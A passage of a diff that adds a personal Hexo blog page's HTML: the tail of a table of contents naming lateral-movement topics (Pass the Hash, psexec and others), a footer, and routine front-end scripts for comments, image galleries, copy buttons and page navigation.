class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-text">代理转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pass-the-Hash"><span class="toc-text">Pass the Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pass-the-Ticket"><span class="toc-text">Pass the Ticket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IPC%E8%BF%9E%E6%8E%A5"><span class="toc-text">IPC连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-text">psexec</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
